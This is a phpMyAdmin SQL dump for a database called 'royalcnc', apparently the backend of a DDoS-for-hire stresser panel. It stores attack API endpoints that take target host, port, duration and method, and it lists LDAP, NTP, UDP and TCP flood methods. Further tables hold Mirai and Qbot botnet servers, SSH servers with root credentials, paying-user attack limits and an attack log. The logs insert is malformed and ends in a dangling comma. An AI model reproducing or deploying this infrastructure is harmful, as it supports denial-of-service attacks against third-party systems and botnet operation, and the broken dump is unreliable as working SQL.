-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jul 18, 2021 at 12:03 AM
-- Server version: 10.4.13-MariaDB
-- PHP Version: 7.4.8

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `royalcnc`
--

-- --------------------------------------------------------

--
-- Table structure for table `apis`
--

CREATE TABLE `apis` (
  `id` int(11) NOT NULL,
  `link` varchar(255) NOT NULL,
  `tag` varchar(255) NOT NULL,
  `active` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `apis`
--

INSERT INTO `apis` (`id`, `link`, `tag`, `active`) VALUES
(1, 'http://77.77.77.77/api?host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]', 'local', 1),
(2, 'http://77.77.77.77/api.php?host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]', 'kek', 0),
(3, 'https://royalstress.site/api/attack?username={USERNAME}&key={PASSWORD}&host={HOST}&port={PORT}&time={TIME}&method={METHOD}', 'Sket', 1);

-- --------------------------------------------------------

--
-- Table structure for table `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `host` varchar(255) NOT NULL,
  `port` int(11) NOT NULL,
  `duration` int(11) NOT NULL,
  `method` varchar(255) NOT NULL,
  `time_sent` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `logs`
--

INSERT INTO `logs` (`id`, `username`, `host`, `port`, `duration`, `method`, `time_sent`) VALUES
(87, 'root', '1.1.1.1', 80, 120, 'LDAP', 1623392365),


-- --------------------------------------------------------

--
-- Table structure for table `methods`
--

CREATE TABLE `methods` (
  `id` int(11) NOT NULL,
  `methods` varchar(255) NOT NULL,
  `active` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `methods`
--

INSERT INTO `methods` (`id`, `methods`, `active`) VALUES
(1, 'LDAP,UDP,TCP,NTP,ARES-LEL', 1);

-- --------------------------------------------------------

--
-- Table structure for table `mirais`
--

CREATE TABLE `mirais` (
  `id` int(11) NOT NULL,
  `host` varchar(255) NOT NULL,
  `port` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `tag` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `mirais`
--

INSERT INTO `mirais` (`id`, `host`, `port`, `username`, `password`, `tag`) VALUES
(1, '1.1.1.1', 23, 'root', 'root', 'Example\r\n');

-- --------------------------------------------------------

--
-- Table structure for table `qbots`
--

CREATE TABLE `qbots` (
  `id` int(11) NOT NULL,
  `host` varchar(255) NOT NULL,
  `port` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `tag` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `qbots`
--

INSERT INTO `qbots` (`id`, `host`, `port`, `username`, `password`, `tag`) VALUES
(2, '2.2.2.2', 999, 'root', 'root', 'Qbot1');

-- --------------------------------------------------------

--
-- Table structure for table `ssh_servers`
--

CREATE TABLE `ssh_servers` (
  `id` int(11) NOT NULL,
  `host` varchar(255) NOT NULL,
  `port` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `tag` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `ssh_servers`
--

INSERT INTO `ssh_servers` (`id`, `host`, `port`, `username`, `password`, `tag`) VALUES
(1, '77.77.77.77', 22, 'root', 'yourpasswords', 'SSH_1');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `apikey` varchar(255) NOT NULL,
  `concurrents` int(11) NOT NULL,
  `max_time` int(11) NOT NULL,
  `rank` int(11) NOT NULL,
  `expire` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `apikey`, `concurrents`, `max_time`, `rank`, `expire`) VALUES
(1, 'root', 'royal', 3, 1200, 2, 1654292052),
(2, 'royal', 'royal', 2, 1200, 0, 1654292052),
(4, 'admin', 'admin', 120, 1200, 1, 1624252611);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `apis`
--
ALTER TABLE `apis`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `methods`
--
ALTER TABLE `methods`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `mirais`
--
ALTER TABLE `mirais`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `qbots`
--
ALTER TABLE `qbots`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ssh_servers`
--
ALTER TABLE `ssh_servers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `apis`
--
ALTER TABLE `apis`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=95;

--
-- AUTO_INCREMENT for table `methods`
--
ALTER TABLE `methods`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `mirais`
--
ALTER TABLE `mirais`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `qbots`
--
ALTER TABLE `qbots`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `ssh_servers`
--
ALTER TABLE `ssh_servers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
